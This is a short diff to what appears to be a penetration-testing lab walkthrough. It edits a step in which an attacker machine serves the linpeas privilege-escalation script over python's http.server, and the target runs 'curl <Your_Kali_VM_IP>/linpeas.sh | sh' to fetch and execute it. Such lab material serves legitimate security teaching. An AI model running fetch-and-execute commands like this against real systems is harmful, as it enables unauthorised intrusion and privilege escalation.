@@ -7,7 +7,7 @@
      linpeas script in the target machine:
         ```python3 -m http.server 80```
   3. From the target machine, we can download the linpeas script from the attacker machine's web server with a curl command:
-        ```curl http://<Your_Kali_VM_IP>/linpeas.sh | sh```
+        ```curl <Your_Kali_VM_IP>/linpeas.sh | sh```
 
   4. make sure to modify permissions to allow us to execute linpeas.sh:
     ```chmod +x linpeas.sh```
